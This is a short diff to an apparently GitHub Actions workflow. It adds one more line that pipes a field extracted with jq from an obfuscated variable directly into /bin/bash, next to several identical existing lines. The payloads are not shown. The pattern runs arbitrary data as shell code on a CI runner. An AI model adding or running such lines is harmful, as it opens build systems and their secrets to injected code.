@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$v464" | jq -r .qxznz55 | /bin/bash
           printf '%s' "$zni7209" | jq -r .iby61271 | /bin/bash
           echo $pta25841 | jq -r .vpqs88 | /bin/bash
+          printf '%s' "$acpk7" | jq -r .mdp523 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
